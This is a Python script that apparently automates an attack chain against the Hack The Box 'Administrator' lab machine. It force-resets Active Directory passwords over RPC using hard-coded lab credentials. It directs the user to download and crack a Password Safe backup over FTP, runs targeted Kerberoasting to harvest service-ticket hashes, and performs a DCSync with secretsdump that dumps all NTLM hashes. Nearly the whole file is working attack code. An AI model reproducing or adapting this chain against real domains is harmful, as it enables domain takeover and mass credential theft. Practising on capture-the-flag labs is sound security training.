import subprocess, shutil, argparse, time, sys, os

TARGET_IP = "10.10.11.42"
DOMAIN = "administrator.htb"

def run_command(cmd, capture=False):
    print(f"[+] Running: {cmd}")
    if capture:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout
    else:
        subprocess.run(cmd, shell=True)

def change_password(current_user, current_pass, target_user, new_pass):
    cmd = f"net rpc password {target_user} {new_pass} -U {DOMAIN}/{current_user}%{current_pass} -S {TARGET_IP}"
    run_command(cmd)

def prepare_targetedkerberoast():
    if not os.path.isdir("targetedKerberoast"):
        print("[*] Downloading targetedKerberoast tool...")
        run_command("git clone https://github.com/ShutdownRepo/targetedKerberoast")
    else:
        print("[*] targetedKerberoast already downloaded.")

def sync_time_with_target():
    print("[*] Synchronizing time with the target (Kerberos needs accurate time)...")
    run_command(f"rdate -n {TARGET_IP}")

def targeted_kerberoast(user, password):
    cmd = f"python3 targetedKerberoast/targetedKerberoast.py -d {DOMAIN} -u {user} -p '{password}' --dc-ip {TARGET_IP} "
    run_command(cmd)

def find_secretsdump():
    if shutil.which("secretsdump.py"):
        print("[*] Found secretsdump.py in PATH.")
        return "secretsdump.py"
    elif shutil.which("impacket-secretsdump"):
        print("[*] Found impacket-secretsdump in PATH.")
        return "impacket-secretsdump"
    else:
        print("[!] Error: secretsdump not found. Install impacket using:")
        print("    pip install impacket")
        sys.exit(1)

def secretsdump_dcsync(user, password):
    secretsdump_tool = find_secretsdump()
    cmd = f"{secretsdump_tool} {DOMAIN}/{user}:{password}@{TARGET_IP}"
    output = run_command(cmd, capture=True)
    print("[+] Hashes dumped:\n", output)

def phase1():
    print("[*] Phase 1 - Changing passwords...")
    change_password("olivia", "ichliebedich", "michael", "pass123")
    time.sleep(1)
    change_password("michael", "pass123", "benjamin", "pass123")
    time.sleep(1)

    print("""\n[!] Manual Step Required:
    -> Login via FTP 10.10.11.42 with:
        Username: benjamin
        Password: pass123
    -> Download Backup.psafe3
    ->Crack it using Hashcat or John, then extract Emily's password manually using the Password Safe program, which can be downloaded from pwsafe.org.""")
    print("\n[✔️] Phase 1 Complete.\n")

def phase2(emily_pass):
    print("[*] Phase 2 - Running targetedKerberoast...")

    prepare_targetedkerberoast()
    sync_time_with_target()
    targeted_kerberoast("emily", emily_pass)

    print(""""\n[!] Manual Step Required:
    -> Crack the extracted TGS hash using hashcat.
    -> Recover Ethan's password.""")
    print("\n[✔️] Phase 2 Complete.\n")

def phase3(ethan_pass):
    print("[*] Phase 3 - Performing DCSync with Ethan's password...")
    secretsdump_dcsync("ethan", ethan_pass)
    print("\n[✔️] Phase 3 Complete. NTLM hashes recovered.\n")



def main():
    parser = argparse.ArgumentParser(description='Administrator HTB Autopwn Script')
    parser.add_argument('--phase', choices=['1', '2', '3'], required=True, help='Phase to execute (1, 2 or 3)')
    parser.add_argument('--emily-pass', help='Password for Emily (only needed for phase 2)')
    parser.add_argument('--ethan-pass', help='Password for Ethan (only needed for phase 3)')
    args = parser.parse_args()

    if args.phase == '1':
        phase1()
    elif args.phase == '2':
        if not args.emily_pass:
            print("[!] Error: --emily-pass is required for phase 2.")
            sys.exit(1)
        phase2(args.emily_pass)
    elif args.phase == '3':
        if not args.ethan_pass:
            print("[!] Error: --ethan-pass is required for phase 3.")
            sys.exit(1)
        phase3(args.ethan_pass)

if __name__ == "__main__":
    main()
